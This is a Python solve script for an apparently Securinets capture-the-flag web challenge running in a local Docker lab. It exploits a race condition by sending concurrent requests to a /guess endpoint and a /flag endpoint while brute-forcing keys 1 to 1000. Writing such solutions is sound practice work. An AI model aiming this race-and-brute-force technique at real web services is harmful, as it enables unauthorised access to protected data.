import requests
import threading
import sys

# The URL where the challenge is running.
BASE_URL = "chall link"
KEY_RANGE = range(1, 1001)

# A global variable to signal all threads to stop once the flag is found.
# Using a list is a simple way to have a mutable object that threads can modify.
flag_found = [False] 

def make_request(session, url, results, key):
    """
    Function executed by each thread. It makes a request and stores the result.
    """
    # If another thread has already found the flag, don't bother making more requests.
    if flag_found[0]:
        return
    try:
        response = session.get(url, timeout=2)
        results[key] = response.text
    except requests.RequestException:
        # If there's a network error, store an empty string.
        results[key] = ""

def solve_race():
    """
    Attempts to solve the race condition using two simultaneous threads for each key.
    """
    try:
        with requests.Session() as s:
            print("Initializing session...")
            init_response = s.get(BASE_URL, timeout=5)
            if init_response.status_code != 200:
                print(f"[!] Error: Could not connect. Status code: {init_response.status_code}")
                return

            print("Session initialized. Starting multi-threaded attack...")

            for key in KEY_RANGE:
                # If the flag has been found by a previous iteration, stop.
                if flag_found[0]:
                    break

                print(f"[*] Trying key: {key}   ", end='\r')

                # A dictionary to hold the responses from our two threads.
                responses = {}
                
                # Define the two URLs we need to hit.
                guess_url = f"{BASE_URL}/guess?key={key}"
                flag_url = f"{BASE_URL}/flag"

                # Create the two threads. One for guessing, one for getting the flag.
                guess_thread = threading.Thread(target=make_request, args=(s, guess_url, responses, 'guess'))
                flag_thread = threading.Thread(target=make_request, args=(s, flag_url, responses, 'flag'))

                # Start both threads. This dispatches them to run concurrently.
                guess_thread.start()
                flag_thread.start()

                # Wait for both threads to finish their requests.
                guess_thread.join()
                flag_thread.join()

                # Now, check the results.
                flag_response_text = responses.get('flag', '')
                if "Securinets{" in flag_response_text:
                    print(f"\n[+] SUCCESS! The key was: {key}")
                    print(f"[+] Flag Response: {flag_response_text.strip()}")
                    flag_found[0] = True # Signal other threads to stop.
                    return

    except requests.exceptions.ConnectionError:
        print(f"\n[!] CONNECTION ERROR: Could not connect to {BASE_URL}.")
        print("[!] Please check that the Docker container is running and the port is correct.")
        sys.exit(1)

    if not flag_found[0]:
        print("\n[-] Failed to find the flag within the specified key range.")

if __name__ == "__main__":
    solve_race()
